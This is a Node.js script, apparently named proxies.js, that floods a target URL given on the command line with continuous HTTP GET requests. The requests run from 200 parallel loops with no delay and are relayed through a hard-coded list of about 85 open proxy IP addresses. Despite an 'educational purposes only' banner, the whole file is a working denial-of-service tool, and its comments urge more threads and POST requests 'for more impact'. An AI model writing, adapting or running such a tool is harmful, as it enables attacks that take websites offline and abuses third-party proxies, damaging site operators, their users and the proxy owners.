// ****************************************************************************
// *                                                                          *
// *  WARNING: This tool is for educational and research purposes ONLY.       *
// *           Unauthorized use is ILLEGAL and can result in severe penalties.*
// *                                                                          *
// *  DISCLAIMER: The creators are NOT responsible for any misuse or damage   *
// *              caused by this tool. Use at your own risk.                *
// *                                                                          *
// ****************************************************************************

// Configuration
const config = {
  threads: 200,         // Number of concurrent threads - INCREASE FOR MORE POWER
  requestTimeout: 5000,   // Request timeout in milliseconds
  maxRetries: 3,          // Maximum number of retries per request
  logFile: 'attack_log.txt', // Log file for all actions
  colorScheme: {
    darkGreen: '#006400',
    purple: '#800080',
    darkRed: '#8B0000',
    darkBlue: '#00008B'
  }
};

const fs = require('fs');
const http = require('http');
const https = require('https');
const url = require('url');

// Proxy list (enlarged for greater impact - **ALWAYS keep updated!**)
const proxies = [
    { "ip": "103.5.146.147", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.233.13.116", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.228.121.14", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.152.167.10", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.137.142.6", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.135.124.2", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.131.192.5", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.129.200.10", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.127.208.2", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.126.144.5", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.124.105.6", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.113.97.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.110.7.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.108.171.5", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.97.149.2", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.88.160.10", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.86.48.13", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.75.184.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.62.152.14", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.59.52.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.56.55.5", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.55.10.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.48.96.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.45.161.5", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.43.34.6", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.41.170.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.38.121.5", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.36.236.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.34.126.6", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.32.74.5", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.31.149.2", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.246.248.10", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.244.86.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.241.228.14", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.240.205.10", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.235.181.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.232.173.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.231.212.10", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.230.118.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.225.146.5", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.221.210.2", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.219.157.13", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.215.131.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.212.218.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.20.198.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.20.107.6", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.197.167.5", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.195.180.14", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.193.161.6", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.183.12.6", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.181.175.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.180.157.5", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.17.174.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.16.110.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.15.72.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.158.243.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.156.142.10", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.155.156.14", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.154.223.10", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.14.250.5", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.14.106.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.143.211.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.141.20.10", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.139.145.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.138.138.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.134.224.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.133.10.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.132.221.10", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.130.188.10", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.128.120.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.125.247.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.123.60.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.122.161.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.121.6.5", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.119.44.5", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.117.176.10", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.116.150.6", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.115.176.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.114.232.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.112.245.2", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.11.215.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.0.243.14", "port": 8080, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.0.158.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
    { "ip": "103.0.156.6", "port": 80, "protocol": "http", "anonymity": "transparent" }
];


// Function to log actions
function log(message) {
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] ${message}\n`;
  fs.appendFile(config.logFile, logEntry, (err) => {
    if (err) console.error('Failed to write to log file:', err);
  });
  console.log(message); // Output to console as well
}

// Function to perform the HTTP request
function attack(targetUrl, proxy) {
  const parsedUrl = url.parse(targetUrl);
  const options = {
    host: proxy.ip,
    port: proxy.port,
    path: parsedUrl.href, // Send full URL in path
    method: 'GET',           // Can be changed to POST for more impact
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate, br',
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1'
    }
  };

  const req = http.request(options, (res) => {
    log(`[${config.colorScheme.darkGreen}] Response: ${res.statusCode} from ${proxy.ip}:${proxy.port}`);
    res.on('data', () => {}); // Consume response data
    res.on('end', () => {});
  });

  req.on('error', (err) => {
    log(`[${config.colorScheme.darkRed}] Request error: ${err.message} via ${proxy.ip}:${proxy.port}`);
  });

  req.setTimeout(config.requestTimeout, () => {
    log(`[${config.colorScheme.darkRed}] Request timed out via ${proxy.ip}:${proxy.port}`);
    req.abort();
  });

  req.end();
}

// Main function to launch the attack
function launchAttack(targetUrl) {
  log(`[${config.colorScheme.purple}] Attacking ${targetUrl} with ${config.threads} threads.`);
  for (let i = 0; i < config.threads; i++) {
    const proxy = proxies[i % proxies.length]; // Cycle through proxies
    setInterval(() => { // Send requests continuously
      attack(targetUrl, proxy);
    }, 0); // Send as fast as possible
  }
}

// Get the target URL from the command line arguments
const targetUrl = process.argv[2];
if (!targetUrl) {
  console.error('Target URL is required. Usage: node proxies.js <target_url>');
  process.exit(1);
}

// Start the attack
launchAttack(targetUrl);